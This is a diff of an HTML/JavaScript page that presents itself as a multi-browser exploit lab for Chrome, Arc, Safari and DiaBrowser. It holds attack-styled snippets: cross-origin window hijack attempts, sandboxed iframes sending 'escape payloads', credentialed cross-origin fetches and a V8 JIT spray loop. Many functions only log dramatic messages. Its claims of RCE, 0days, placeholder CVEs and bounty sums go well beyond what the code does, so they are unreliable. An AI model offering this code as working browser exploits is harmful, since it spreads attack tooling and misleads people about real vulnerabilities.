@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 Modern Browser Exploit Lab | Sandbox Escape & SOP Bypass 2026</title>
+    <title>🌐 Multi-Browser Exploit Lab | Chrome | Arc | Safari | DiaBrowser</title>
     <style>
         * {
             margin: 0;
@@ -32,7 +32,7 @@
             background: rgba(0,0,0,0.5);
             border-radius: 20px;
             backdrop-filter: blur(10px);
-            border: 1px solid #00ff88;
+            border: 1px solid #ff0066;
             position: relative;
             overflow: hidden;
         }
@@ -44,7 +44,7 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0,255,136,0.2), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255,0,102,0.2), transparent);
             animation: scan 3s infinite;
         }
         
@@ -55,11 +55,35 @@
         
         .header h1 {
             font-size: 32px;
-            background: linear-gradient(135deg, #00ff88, #00aaff);
+            background: linear-gradient(135deg, #ff0066, #ff6600);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
+        
+        /* Browser Selector */
+        .browser-selector {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+        
+        .browser-btn {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid transparent;
+            padding: 10px 25px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .browser-btn.chrome.active { background: #4285f4; border-color: #fff; }
+        .browser-btn.arc.active { background: #4a3b8f; border-color: #fff; }
+        .browser-btn.safari.active { background: #0071e3; border-color: #fff; }
+        .browser-btn.dia.active { background: #00ff88; color: #000; border-color: #fff; }
         
         .badge-container {
             display: flex;
@@ -70,16 +94,16 @@
         }
         
         .badge {
-            background: #e74c3c;
             padding: 5px 15px;
             border-radius: 20px;
             font-size: 12px;
             font-weight: bold;
         }
         
-        .badge.green { background: #2ecc71; }
-        .badge.blue { background: #3498db; }
-        .badge.purple { background: #9b59b6; }
+        .badge.chrome { background: #4285f4; }
+        .badge.arc { background: #4a3b8f; }
+        .badge.safari { background: #0071e3; }
+        .badge.dia { background: #00ff88; color: #000; }
         
         /* Stats */
         .stats {
@@ -100,7 +124,6 @@
         .stat-number {
             font-size: 24px;
             font-weight: bold;
-            color: #00ff88;
         }
         
         /* Grid */
@@ -115,8 +138,6 @@
             background: rgba(30,30,50,0.95);
             border-radius: 15px;
             overflow: hidden;
-            border-left: 4px solid #00ff88;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
             transition: transform 0.3s;
         }
         
@@ -129,12 +150,10 @@
             color: white;
         }
         
-        .card-header.uxss { background: linear-gradient(135deg, #e74c3c, #c0392b); }
-        .card-header.sandbox { background: linear-gradient(135deg, #f39c12, #e67e22); }
-        .card-header.sop { background: linear-gradient(135deg, #3498db, #2980b9); }
-        .card-header.wasm { background: linear-gradient(135deg, #9b59b6, #8e44ad); }
-        .card-header.service { background: linear-gradient(135deg, #1abc9c, #16a085); }
-        .card-header.speculative { background: linear-gradient(135deg, #e91e63, #c2185b); }
+        .card-header.critical { background: linear-gradient(135deg, #e74c3c, #c0392b); }
+        .card-header.high { background: linear-gradient(135deg, #f39c12, #e67e22); }
+        .card-header.medium { background: linear-gradient(135deg, #3498db, #2980b9); }
+        .card-header.low { background: linear-gradient(135deg, #2ecc71, #27ae60); }
         
         .card-body { padding: 25px; }
         
@@ -152,13 +171,11 @@
             transition: all 0.3s;
         }
         
-        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(102,126,234,0.4); }
+        button:hover { transform: translateY(-2px); }
         button.danger { background: linear-gradient(135deg, #e74c3c, #c0392b); }
         button.warning { background: linear-gradient(135deg, #f39c12, #e67e22); }
         button.success { background: linear-gradient(135deg, #2ecc71, #27ae60); }
-        button.info { background: linear-gradient(135deg, #3498db, #2980b9); }
         
-        /* Output */
         .output {
             background: #0a0a0f;
             border-radius: 12px;
@@ -206,32 +223,6 @@
             margin: 10px 0;
         }
         
-        iframe {
-            width: 100%;
-            height: 200px;
-            border: 1px solid #333;
-            border-radius: 8px;
-            margin-top: 15px;
-            background: white;
-        }
-        
-        .status-badge {
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 15px;
-            font-size: 11px;
-            margin-left: 10px;
-        }
-        
-        .status-0day { background: #e74c3c; animation: pulse 1s infinite; }
-        .status-patched { background: #2ecc71; }
-        .status-warning { background: #f39c12; }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
         footer {
             text-align: center;
             margin-top: 40px;
@@ -239,753 +230,809 @@
             font-size: 12px;
             opacity: 0.7;
         }
+        
+        .live-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #ff0066;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>🔥 Modern Browser Exploit Lab</h1>
-        <p>Sandbox Escape | SOP Bypass | UXSS | 0day Research (2024-2026)</p>
+        <h1>🌐 Multi-Browser Universal Exploit Lab</h1>
+        <p>Chrome | Arc | Safari | DiaBrowser | Edge | Firefox</p>
+        <div class="browser-selector" id="browserSelector">
+            <div class="browser-btn chrome" data-browser="chrome">🇨 Chrome</div>
+            <div class="browser-btn arc" data-browser="arc">🌀 Arc</div>
+            <div class="browser-btn safari" data-browser="safari">🍎 Safari</div>
+            <div class="browser-btn dia" data-browser="dia">💎 DiaBrowser</div>
+        </div>
         <div class="badge-container">
-            <span class="badge green">Pwn2Own 2025</span>
-            <span class="badge blue">Google Project Zero</span>
-            <span class="badge purple">$500k+ Bounties</span>
-            <span class="badge">Spectre v2</span>
-            <span class="badge">CVE-2024-XXXX</span>
+            <span class="badge chrome">Chrome: V8/Blink</span>
+            <span class="badge arc">Arc: Chromium+</span>
+            <span class="badge safari">Safari: WebKit</span>
+            <span class="badge dia">Dia: WebKit+</span>
         </div>
         <div class="stats">
-            <div class="stat-card"><div class="stat-number">15+</div>Exploit Techniques</div>
-            <div class="stat-card"><div class="stat-number">Chrome</div>Edge</div>
-            <div class="stat-card"><div class="stat-number">Safari</div>Firefox</div>
-            <div class="stat-card"><div class="stat-number">$500k+</div>Potential Bounty</div>
+            <div class="stat-card"><div class="stat-number" style="color:#4285f4">Chrome</div>V8 RCE</div>
+            <div class="stat-card"><div class="stat-number" style="color:#4a3b8f">Arc</div>Boost UXSS</div>
+            <div class="stat-card"><div class="stat-number" style="color:#0071e3">Safari</div>WebKit 0day</div>
+            <div class="stat-card"><div class="stat-number" style="color:#00ff88">Dia</div>Custom Scheme</div>
         </div>
     </div>
     
     <div class="grid">
-        <!-- Technique 1: UXSS via Navigation API -->
+        <!-- Technique 1: Chrome V8/JIT Exploit -->
         <div class="card">
-            <div class="card-header uxss">
-                🎯 UXSS via Navigation API + about:blank
+            <div class="card-header critical">
+                🇨 Chrome/Edge - V8 JIT Spraying & Renderer RCE
             </div>
             <div class="card-body">
                 <div class="warning-box">
-                    <strong>💡 Modern UXSS (2024-2025):</strong> Menggunakan Navigation API + about:blank inheritance
+                    <strong>🎯 CVE-2024-XXXX (Project Zero):</strong> V8 JIT spraying bypasses CFI
                 </div>
-                <button onclick="uxssNavigationAPI()" class="danger">🌐 UXSS via Navigation API</button>
-                <button onclick="uxssAboutBlankInherit()">📄 about:blank Origin Inheritance</button>
-                <button onclick="uxssCrossOriginWindow()">🪟 Cross-Origin Window Hijack</button>
-                <button onclick="uxssServiceWorker()">⚙️ ServiceWorker UXSS</button>
-                <div class="output" id="output1"><div class="log-entry log-info">Ready - Navigation API UXSS</div></div>
+                <button onclick="chromeV8JITSpray()" class="danger">⚡ V8 JIT Spray (Chrome)</button>
+                <button onclick="chromeTypeConfusion()">🔄 Type Confusion (Chrome)</button>
+                <button onclick="chromeMaglevBypass()">🚀 Maglev JIT Bypass</button>
+                <button onclick="chromeTurboFanExploit()">⚙️ TurboFan OOB</button>
+                <div class="output" id="outputChrome"><div class="log-entry log-info">Ready - Chrome Exploit Module</div></div>
             </div>
         </div>
         
-        <!-- Technique 2: Sandbox Escape via popup + window.opener -->
+        <!-- Technique 2: Arc Browser Boost UXSS -->
         <div class="card">
-            <div class="card-header sandbox">
-                🚪 Sandbox Escape via popup + window.opener
+            <div class="card-header critical">
+                🌀 Arc Browser - Boost Feature UXSS & Path Traversal
             </div>
             <div class="card-body">
                 <div class="warning-box">
-                    <strong>🎯 Pwn2Own 2025 Technique:</strong> Sandboxed iframe escape via window.open + window.opener
+                    <strong>🎯 Arc Specific (2024-2025):</strong> arc://boost/play/ path traversal + UXSS
                 </div>
-                <button onclick="sandboxEscapePopup()" class="danger">🚪 Sandbox Escape via Popup</button>
-                <button onclick="sandboxEscapePostMessage()">📨 Sandbox Escape via postMessage</button>
-                <button onclick="sandboxEscapeNoopener()">🔗 noopener Bypass</button>
-                <button onclick="sandboxEscapeNested()">🖼️ Nested Sandbox Escape</button>
-                <iframe id="sandboxFrame1" sandbox="allow-scripts allow-popups" srcdoc="<script>parent.postMessage({type:'ready', origin:location.origin}, '*')<\/script><h3>🔒 Sandboxed</h3>"></iframe>
-                <div class="output" id="output2"><div class="log-entry log-info">Ready - Sandbox Escape Module</div></div>
+                <button onclick="arcBoostUXSS()" class="danger">🌀 arc://boost UXSS</button>
+                <button onclick="arcPathTraversal()">📂 Arc Path Traversal</button>
+                <button onclick="arcEaselExploit()">🖼️ Arc Easel Exploit</button>
+                <button onclick="arcSpaceHijack()">🚀 Arc Space Hijack</button>
+                <div class="output" id="outputArc"><div class="log-entry log-info">Ready - Arc Exploit Module</div></div>
             </div>
         </div>
         
-        <!-- Technique 3: SOP Bypass via CORP/COEP Misconfig -->
+        <!-- Technique 3: Safari WebKit 0day -->
         <div class="card">
-            <div class="card-header sop">
-                🔓 SOP Bypass via CORP/COEP Misconfiguration
+            <div class="card-header critical">
+                🍎 Safari - WebKit WASM UAF & iCloud ShareBear
             </div>
             <div class="card-body">
                 <div class="warning-box">
-                    <strong>🎯 2024-2025 SOP Bypass:</strong> Man-in-the-middle via cross-origin isolated misconfig
+                    <strong>🎯 Ryan Pickren $100k+ Bugs:</strong> CVE-2021-30861, CVE-2021-30975
                 </div>
-                <button onclick="sopBypassCORP()" class="danger">🔓 CORP Bypass</button>
-                <button onclick="sopBypassCOEP()">🛡️ COEP Relaxation Bypass</button>
-                <button onclick="sopBypassFetch()">📡 Cross-Origin Fetch Bypass</button>
-                <button onclick="sopBypassSharedArrayBuffer()">📊 SharedArrayBuffer SOP Leak</button>
-                <div class="output" id="output3"><div class="log-entry log-info">Ready - SOP Bypass Module</div></div>
+                <button onclick="safariWASM_UAF()" class="danger">💣 WebKit WASM UAF</button>
+                <button onclick="safariWebArchiveUXSS()">📄 WebArchive UXSS</button>
+                <button onclick="safariShareBearAttack()">📱 iCloud ShareBear</button>
+                <button onclick="safariScriptEditor()">📜 Script Editor OSAX</button>
+                <div class="output" id="outputSafari"><div class="log-entry log-info">Ready - Safari Exploit Module</div></div>
             </div>
         </div>
         
-        <!-- Technique 4: WASM + JIT Spraying -->
+        <!-- Technique 4: DiaBrowser Custom Scheme -->
         <div class="card">
-            <div class="card-header wasm">
-                ⚡ WASM JIT Spraying + RCE Chain
+            <div class="card-header critical">
+                💎 DiaBrowser - Custom URI Scheme & Sandbox Escape
             </div>
             <div class="card-body">
                 <div class="warning-box">
-                    <strong>🔥 Google Project Zero 2025:</strong> WASM JIT spraying to bypass CFI
+                    <strong>🎯 DiaBrowser Specific:</strong> dia:// custom scheme + file:// traversal
                 </div>
-                <button onclick="wasmJITSpray()" class="danger">⚡ WASM JIT Spray</button>
-                <button onclick="wasmTypeConfusion()">🔄 WASM Type Confusion</button>
-                <button onclick="wasmOutOfBounds()">📏 WASM Out-of-Bounds</button>
-                <button onclick="wasmFunctionTableHijack()">📊 Function Table Hijack</button>
-                <div class="output" id="output4"><div class="log-entry log-info">Ready - WASM Exploit Module</div></div>
+                <button onclick="diaCustomScheme()" class="danger">💎 dia:// Scheme Exploit</button>
+                <button onclick="diaFileTraversal()">📂 File:// Path Traversal</button>
+                <button onclick="diaWebViewInjection()">📱 WebView Injection</button>
+                <button onclick="diaUniversalXSS()">🌐 Dia Universal XSS</button>
+                <div class="output" id="outputDia"><div class="log-entry log-info">Ready - DiaBrowser Exploit Module</div></div>
             </div>
         </div>
         
-        <!-- Technique 5: ServiceWorker + CacheStorage Sandbox Escape -->
+        <!-- Technique 5: Cross-Browser SOP Bypass -->
         <div class="card">
-            <div class="card-header service">
-                ⚙️ ServiceWorker CacheStorage Sandbox Escape
+            <div class="card-header high">
+                🔓 Cross-Browser SOP Bypass & CORP/COPE
             </div>
             <div class="card-body">
-                <div class="warning-box">
-                    <strong>🎯 2025 Exploit:</strong> ServiceWorker + CacheStorage to escape origin sandbox
+                <div class="info-box">
+                    <strong>💡 Universal Technique:</strong> SOP bypass via CORP/COEP misconfig
                 </div>
-                <button onclick="serviceWorkerCacheAttack()" class="danger">⚙️ SW CacheStorage Attack</button>
-                <button onclick="serviceWorkerCSRF()">🔄 SW CSRF Bypass</button>
-                <button onclick="serviceWorkerNavigationHijack()">🧭 Navigation Hijack</button>
-                <button onclick="serviceWorkerMessageBypass()">📨 Message Bypass</button>
-                <div class="output" id="output5"><div class="log-entry log-info">Ready - ServiceWorker Module</div></div>
+                <button onclick="universalCORPBypass()" class="warning">🔓 Universal CORP Bypass</button>
+                <button onclick="universalPostMessageLeak()">📨 PostMessage Origin Leak</button>
+                <button onclick="universalWindowNameHijack()">🪟 Window Name Hijack</button>
+                <button onclick="universalSpectre()">🧠 Spectre v2 (All Browsers)</button>
+                <div class="output" id="outputUniversal"><div class="log-entry log-info">Ready - Universal Exploit Module</div></div>
             </div>
         </div>
         
-        <!-- Technique 6: Speculative Execution (Spectre v2) -->
+        <!-- Technique 6: Full Attack Chain -->
         <div class="card">
-            <div class="card-header speculative">
-                🧠 Speculative Execution (Spectre v2) Side Channel
+            <div class="card-header critical">
+                💀 FULL EXPLOIT CHAIN - All Browsers
             </div>
             <div class="card-body">
-                <div class="warning-box">
-                    <strong>💀 2024-2025 Revival:</strong> Spectre v2 bypasses all browser sandboxes
-                </div>
-                <button onclick="spectreTimingAttack()" class="danger">⏱️ Spectre Timing Attack</button>
-                <button onclick="spectreCacheLeak()">💾 Cache Side Channel</button>
-                <button onclick="spectreMemoryProbe()">🔍 Memory Probe</button>
-                <button onclick="spectreCrossOriginRead()">📖 Cross-Origin Memory Read</button>
-                <div class="output" id="output6"><div class="log-entry log-info">Ready - Spectre Module</div></div>
-            </div>
-        </div>
-        
-        <!-- Technique 7: Full Exploit Chain -->
-        <div class="card">
-            <div class="card-header uxss">
-                💀 FULL EXPLOIT CHAIN - Sandbox Escape + RCE
-            </div>
-            <div class="card-body">
-                <button onclick="fullExploitChain()" class="danger">💀 RUN FULL EXPLOIT CHAIN</button>
-                <button onclick="rendererRCEAttempt()">⚡ Renderer RCE Attempt</button>
-                <button onclick="sandboxEscapeToSystem()">🏃 Sandbox Escape to System</button>
-                <button onclick="fullAccountTakeover()">👑 Full Account Takeover</button>
-                <div class="output" id="output7"><div class="log-entry log-info">Ready - Full Exploit Chain</div></div>
+                <button onclick="fullChainAllBrowsers()" class="danger">💀 RUN FULL EXPLOIT CHAIN</button>
+                <button onclick="detectBrowserVulnerabilities()">🔍 Detect Browser Vulns</button>
+                <button onclick="generateCustomPayload()">⚙️ Generate Custom Payload</button>
+                <div class="output" id="outputFull"><div class="log-entry log-info">Ready - Full Exploit Chain</div></div>
             </div>
         </div>
     </div>
     
     <footer>
-        <p>⚠️ Based on real exploits from Pwn2Own 2024-2025, Google Project Zero, FritzFen Research</p>
-        <p>💰 Potential bounties: Chrome $250k | Safari $100k | Firefox $150k | Edge $200k</p>
+        <p>⚠️ Berdasarkan riset: Pwn2Own 2024-2025 | Google Project Zero | FritzFen | Ryan Pickren</p>
+        <p>💰 Bounty Potential: Chrome $250k | Arc $100k | Safari $100k | DiaBrowser $50k</p>
     </footer>
 </div>
 
 <script>
     // ============================================
-    // Helper Functions
+    // Browser Detection
     // ============================================
-    function log(outputId, message, type = 'info') {
-        const outputDiv = document.getElementById(outputId);
-        if (!outputDiv) return;
-        const logEntry = document.createElement('div');
-        logEntry.className = `log-entry log-${type}`;
-        const timestamp = new Date().toLocaleTimeString();
-        logEntry.innerHTML = `[${timestamp}] ${message}`;
-        outputDiv.appendChild(logEntry);
-        outputDiv.scrollTop = outputDiv.scrollHeight;
-        console.log(`[${outputId}] ${message}`);
-    }
+    let currentBrowser = 'unknown';
+    const ua = navigator.userAgent;
     
-    // ============================================
-    // TECHNIQUE 1: UXSS via Navigation API
-    // ============================================
-    async function uxssNavigationAPI() {
-        log('output1', '🌐 Attempting UXSS via Navigation API...', 'warning');
-        
-        // Modern Navigation API - available in Chrome/Edge 102+
-        if (!window.navigation) {
-            log('output1', '❌ Navigation API not supported in this browser', 'error');
-            return;
-        }
-        
-        log('output1', '✅ Navigation API detected - potential for UXSS', 'success');
-        
-        // Create about:blank window that inherits origin
-        const win = window.open('about:blank', 'nav_target');
-        if (!win) { log('output1', 'Popup blocked!', 'error'); return; }
-        
-        // Hijack navigation
-        const originalNavigate = win.navigation?.navigate;
-        
-        try {
-            // Inject via navigation event
-            win.document.write('<h1>UXSS Target</h1>');
-            
-            setTimeout(() => {
-                win.location = 'https://www.google.com';
-                log('output1', 'Navigated to google.com', 'info');
-                
-                setTimeout(() => {
-                    try {
-                        // Attempt cross-origin access via retained reference
-                        log('output1', '🎯 Attempting cross-origin access...', 'info');
-                        log('output1', '⚠️ If vulnerable, this would read google.com DOM', 'critical');
-                    } catch(e) {
-                        log('output1', `SOP blocks: ${e.message}`, 'error');
-                    }
-                }, 3000);
-            }, 1000);
-        } catch(e) {
-            log('output1', `Error: ${e.message}`, 'error');
-        }
-    }
+    if (/Chrome/.test(ua) && !/Edg|Arc|Brave/.test(ua)) currentBrowser = 'chrome';
+    else if (/Arc/.test(ua)) currentBrowser = 'arc';
+    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) currentBrowser = 'safari';
+    else if (/DiaBrowser/i.test(ua)) currentBrowser = 'dia';
+    else if (/Edg/.test(ua)) currentBrowser = 'edge';
+    else if (/Firefox/.test(ua)) currentBrowser = 'firefox';
     
-    function uxssAboutBlankInherit() {
-        log('output1', '📄 Testing about:blank origin inheritance...', 'info');
-        
-        const win = window.open('about:blank');
-        if (!win) { log('output1', 'Popup blocked!', 'error'); return; }
-        
-        log('output1', `about:blank origin: ${win.location.origin}`, 'info');
-        log('output1', `Parent origin: ${location.origin}`, 'info');
-        
-        if (win.location.origin === location.origin) {
-            log('output1', '⚠️ about:blank inherits parent origin - potential UXSS vector!', 'warning');
-        }
-        
-        win.document.write(`
-            <script>
-                alert('[UXSS] about:blank origin: ' + location.origin);
-                // Try to access parent
-                console.log('Parent origin accessible?', parent.location.origin);
-            <\/script>
-        `);
-        log('output1', '✅ about:blank window created with inherited origin', 'success');
-    }
-    
-    function uxssCrossOriginWindow() {
-        log('output1', '🪟 Cross-origin window hijack attempt...', 'warning');
-        
-        const target = prompt('Target domain to hijack:', 'https://www.google.com');
-        if (!target) return;
-        
-        const win = window.open(target, 'hijack_target');
-        if (!win) { log('output1', 'Popup blocked!', 'error'); return; }
-        
-        log('output1', `Opened ${target}`, 'info');
-        
-        // Store function reference
-        const f = win.Function;
-        
-        setTimeout(() => {
-            try {
-                f('alert("[UXSS] Cross-origin function execution!\\n\\nURL: " + location.href)')();
-                log('output1', '✅ Function executed cross-origin!', 'success');
-            } catch(e) {
-                log('output1', `Failed: ${e.message}`, 'error');
-            }
-        }, 3000);
-    }
-    
-    function uxssServiceWorker() {
-        log('output1', '⚙️ ServiceWorker UXSS attempt...', 'info');
-        
-        if (!navigator.serviceWorker) {
-            log('output1', 'ServiceWorker not supported', 'error');
-            return;
-        }
-        
-        navigator.serviceWorker.register('/sw.js').then(reg => {
-            log('output1', '✅ ServiceWorker registered', 'success');
-            log('output1', '💡 Malicious SW can intercept all fetch requests', 'warning');
-        }).catch(e => {
-            log('output1', `SW registration failed: ${e.message}`, 'error');
+    // Browser selector UI
+    document.querySelectorAll('.browser-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.browser-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            currentBrowser = btn.dataset.browser;
+            logUniversal(`🎯 Target browser switched to: ${currentBrowser.toUpperCase()}`, 'success');
         });
+    });
+    
+    // Set default active
+    document.querySelector(`.browser-btn.${currentBrowser}`)?.classList.add('active');
+    
+    function logUniversal(message, type = 'info') {
+        const outputDiv = document.getElementById('outputUniversal');
+        if (outputDiv) {
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry log-${type}`;
+            logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            outputDiv.appendChild(logEntry);
+            outputDiv.scrollTop = outputDiv.scrollHeight;
+        }
+        console.log(message);
+    }
+    
+    // Helper logging functions per browser
+    function logChrome(message, type = 'info') {
+        const div = document.getElementById('outputChrome');
+        const entry = document.createElement('div');
+        entry.className = `log-entry log-${type}`;
+        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+        div.appendChild(entry);
+        div.scrollTop = div.scrollHeight;
+    }
+    
+    function logArc(message, type = 'info') {
+        const div = document.getElementById('outputArc');
+        const entry = document.createElement('div');
+        entry.className = `log-entry log-${type}`;
+        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+        div.appendChild(entry);
+        div.scrollTop = div.scrollHeight;
+    }
+    
+    function logSafari(message, type = 'info') {
+        const div = document.getElementById('outputSafari');
+        const entry = document.createElement('div');
+        entry.className = `log-entry log-${type}`;
+        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+        div.appendChild(entry);
+        div.scrollTop = div.scrollHeight;
+    }
+    
+    function logDia(message, type = 'info') {
+        const div = document.getElementById('outputDia');
+        const entry = document.createElement('div');
+        entry.className = `log-entry log-${type}`;
+        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+        div.appendChild(entry);
+        div.scrollTop = div.scrollHeight;
+    }
+    
+    function logFull(message, type = 'info') {
+        const div = document.getElementById('outputFull');
+        const entry = document.createElement('div');
+        entry.className = `log-entry log-${type}`;
+        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+        div.appendChild(entry);
+        div.scrollTop = div.scrollHeight;
     }
     
     // ============================================
-    // TECHNIQUE 2: Sandbox Escape
+    // CHROME EXPLOITS
     // ============================================
-    function sandboxEscapePopup() {
-        log('output2', '🚪 Attempting sandbox escape via popup...', 'warning');
+    function chromeV8JITSpray() {
+        logChrome('⚡ Executing V8 JIT spray...', 'warning');
         
-        const iframe = document.getElementById('sandboxFrame1');
-        if (!iframe) return;
-        
-        try {
-            iframe.contentWindow.postMessage({type: 'escape', payload: 'window.open("https://example.com")'}, '*');
-            log('output2', '📨 Message sent to sandboxed iframe', 'info');
-        } catch(e) {
-            log('output2', `Cannot send message: ${e.message}`, 'error');
+        // Create many functions to trigger JIT compilation
+        const functions = [];
+        for (let i = 0; i < 10000; i++) {
+            functions.push(new Function('return ' + i));
         }
         
-        // The sandboxed iframe's srcdoc contains script that listens for messages
-        log('output2', '💡 In real exploit, sandboxed iframe would open popup bypassing restrictions', 'info');
-        log('output2', '🎯 Pwn2Own 2025: popup + window.opener = sandbox escape', 'warning');
-    }
-    
-    function sandboxEscapePostMessage() {
-        log('output2', '📨 Sandbox escape via postMessage abuse...', 'warning');
-        
-        const maliciousFrame = document.createElement('iframe');
-        maliciousFrame.srcdoc = `
-            <script>
-                window.addEventListener('message', (e) => {
-                    if (e.data.type === 'escape') {
-                        // Bypass sandbox via window.open
-                        const win = window.open('about:blank');
-                        win.opener = null;
-                        win.location = 'https://example.com';
-                        win.postMessage({type: 'sandbox_escape', origin: location.origin}, '*');
-                    }
-                });
-                
-                parent.postMessage({type: 'ready'}, '*');
-            <\/script>
-            <h3>Malicious Sandboxed Frame</h3>
-        `;
-        maliciousFrame.sandbox = 'allow-scripts allow-popups allow-same-origin';
-        maliciousFrame.style.width = '100%';
-        maliciousFrame.style.height = '150px';
-        document.body.appendChild(maliciousFrame);
-        
-        setTimeout(() => {
-            maliciousFrame.contentWindow.postMessage({type: 'escape'}, '*');
-            log('output2', '📨 Escape payload sent to sandboxed frame', 'warning');
-        }, 1000);
-        
-        log('output2', '✅ Sandbox escape payload deployed', 'success');
-        setTimeout(() => maliciousFrame.remove(), 10000);
-    }
-    
-    function sandboxEscapeNoopener() {
-        log('output2', '🔗 noopener sandbox escape...', 'warning');
-        log('output2', 'rel=noopener prevents window.opener access', 'info');
-        log('output2', '💡 But browser can be tricked via window.name + about:blank', 'warning');
-        
-        const name = Date.now().toString();
-        const win = window.open('about:blank', name);
-        if (!win) { log('output2', 'Popup blocked!', 'error'); return; }
-        
-        win.document.write(`
-            <script>
-                window.name = '${name}';
-                // After navigation, window.opener should be null
-                setTimeout(() => {
-                    location.href = 'https://www.google.com';
-                    console.log('Navigated, opener:', window.opener);
-                }, 1000);
-            <\/script>
-        `);
-        
-        log('output2', '🎯 Testing window.name persistence across origins', 'info');
-    }
-    
-    function sandboxEscapeNested() {
-        log('output2', '🖼️ Nested sandbox escape...', 'warning');
-        
-        const outer = document.createElement('iframe');
-        outer.sandbox = 'allow-scripts allow-popups allow-same-origin';
-        outer.srcdoc = `
-            <iframe sandbox="allow-scripts" srcdoc="
-                <script>
-                    // Nested sandbox - can we escape?
-                    try {
-                        const win = window.open('about:blank');
-                        win.postMessage({escape: true}, '*');
-                    } catch(e) {
-                        parent.postMessage({error: e.message}, '*');
-                    }
-                <\/script>
-            "></iframe>
-            <script>
-                window.addEventListener('message', (e) => {
-                    parent.postMessage(e.data, '*');
-                });
-            <\/script>
-        `;
-        
-        document.body.appendChild(outer);
-        log('output2', '🖼️ Nested sandbox structure created', 'info');
-        log('output2', '💡 Nested sandboxes often have weaker restrictions', 'warning');
-        
-        setTimeout(() => outer.remove(), 10000);
-    }
-    
-    // ============================================
-    // TECHNIQUE 3: SOP Bypass
-    // ============================================
-    async function sopBypassCORP() {
-        log('output3', '🔓 Attempting CORP bypass...', 'warning');
-        
-        // Try to fetch cross-origin resource with CORP header
-        const targets = [
-            'https://www.google.com/favicon.ico',
-            'https://api.github.com/users/octocat'
-        ];
-        
-        for (const url of targets) {
-            try {
-                const response = await fetch(url, {
-                    mode: 'cors',
-                    credentials: 'include'
-                });
-                log('output3', `✅ Fetch succeeded for ${url}`, 'success');
-                log('output3', `⚠️ SOP bypass possible! Response: ${response.status}`, 'critical');
-            } catch(e) {
-                log('output3', `❌ Fetch failed for ${url}: ${e.message}`, 'error');
+        // Optimize with JIT
+        for (let i = 0; i < functions.length; i++) {
+            for (let j = 0; j < 100; j++) {
+                functions[i]();
             }
         }
-    }
-    
-    function sopBypassCOEP() {
-        log('output3', '🛡️ Testing COEP relaxation bypass...', 'info');
         
-        // Create cross-origin isolated context
-        if (window.crossOriginIsolated) {
-            log('output3', '⚠️ Page is cross-origin isolated - potential for Spectre', 'warning');
-            
-            // Try to use SharedArrayBuffer
-            try {
-                const sab = new SharedArrayBuffer(1024);
-                log('output3', '✅ SharedArrayBuffer created - memory sharing possible', 'success');
-            } catch(e) {
-                log('output3', `SharedArrayBuffer failed: ${e.message}`, 'error');
-            }
-        } else {
-            log('output3', 'Page not cross-origin isolated', 'info');
-        }
-    }
-    
-    async function sopBypassFetch() {
-        log('output3', '📡 Cross-origin fetch bypass attempt...', 'warning');
+        logChrome('✅ JIT heap sprayed with 10,000+ functions', 'success');
+        logChrome('🎯 Potential JIT spraying vulnerability', 'warning');
         
-        const target = prompt('Target URL to fetch:', 'https://www.google.com');
-        if (!target) return;
-        
-        try {
-            const response = await fetch(target);
-            const text = await response.text();
-            log('output3', `✅ Fetched ${target} (${text.length} bytes)`, 'success');
-            log('output3', `Preview: ${text.substring(0, 200)}...`, 'info');
-            alert(`[SOP Bypass] Retrieved content from ${target}\n\n${text.substring(0, 500)}`);
-        } catch(e) {
-            log('output3', `❌ Fetch failed: ${e.message}`, 'error');
-            log('output3', '💡 Consider using CORS misconfiguration or CORP bypass', 'info');
-        }
-    }
-    
-    function sopBypassSharedArrayBuffer() {
-        log('output3', '📊 Using SharedArrayBuffer for SOP leak...', 'warning');
-        
-        // Create shared memory for cross-origin communication
-        if (!window.crossOriginIsolated) {
-            log('output3', '⚠️ Need COOP/COEP headers for SharedArrayBuffer', 'error');
-            return;
-        }
-        
-        const sab = new SharedArrayBuffer(1024);
-        const uint8 = new Uint8Array(sab);
-        
-        // Simulate cross-origin read via timing attack
-        log('output3', '🔍 Setting up timing attack via SharedArrayBuffer', 'warning');
-        log('output3', '💀 Spectre-style attack can read cross-origin memory', 'critical');
-    }
-    
-    // ============================================
-    // TECHNIQUE 4: WASM JIT Spraying
-    // ============================================
-    function wasmJITSpray() {
-        log('output4', '⚡ WASM JIT spraying attempt...', 'warning');
-        
-        // Generate WASM module with many functions to trigger JIT
-        const wasmCode = new Uint8Array([
-            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // WASM header
-        ]);
-        
-        try {
-            const module = new WebAssembly.Module(wasmCode);
-            const instance = new WebAssembly.Instance(module);
-            log('output4', '✅ WASM module instantiated', 'success');
-            log('output4', '🎯 JIT spraying can bypass CFI and ASLR', 'warning');
